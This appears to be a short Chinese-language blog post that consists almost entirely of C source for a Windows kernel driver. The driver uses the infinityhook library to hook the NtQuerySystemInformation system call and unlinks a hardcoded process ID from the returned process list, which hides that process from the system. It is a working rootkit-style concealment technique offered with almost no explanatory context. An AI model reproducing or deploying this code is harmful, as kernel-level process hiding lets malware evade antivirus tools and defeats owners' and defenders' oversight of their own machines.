---
layout: post
title: syscallhook
date: 2019-08-03
tags: 博客    
---

### 基于事件跟踪会话的syscallhook
<img src="/images/A/test.gif" height="720" width="1200">

```
#include "main.h"

#define DPRINT(format, ...)         DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, __VA_ARGS__)

static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");

static ZwQuerySystemInformationT  Old_ZwQuerySystemInformation = NULL;

NTSTATUS New_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	// 要隐藏的进程PID
	HANDLE dwHideProcessId = (HANDLE)5716;

	status = Old_ZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			if (dwHideProcessId == pCur->UniqueProcessId)
			{
				if (0 == pCur->NextEntryOffset)
				{
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
			}
			else
			{
				pPrev = pCur;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((unsigned char *)pCur + pCur->NextEntryOffset);
		}
	}
	return status;
}

void __fastcall SyscallStub(
	_In_ unsigned int SystemCallIndex,
	_Inout_ void** SystemCallFunction)
{
	UNREFERENCED_PARAMETER(SystemCallIndex);
	if (*SystemCallFunction == Old_ZwQuerySystemInformation)
	{
		*SystemCallFunction = New_ZwQuerySystemInformation;
	}
}


NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT pPDriverObj, _In_ PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pRegistryPath);

	pPDriverObj->DriverUnload = DriverUnload;

	Old_ZwQuerySystemInformation = (ZwQuerySystemInformationT)MmGetSystemRoutineAddress(&StringNtQuerySystemInformation);
	DPRINT("[+] NtQuerySystemInformation %p\n", Old_ZwQuerySystemInformation);
	if (!Old_ZwQuerySystemInformation)
	{
		DPRINT("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQuerySystemInformation);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	NTSTATUS Status = IfhInitialize(SyscallStub);
	if (!NT_SUCCESS(Status))
	{
		DPRINT("[-] infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
	}
	return Status;
}


void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	IfhRelease();

	DPRINT("Unload\n");
}
```

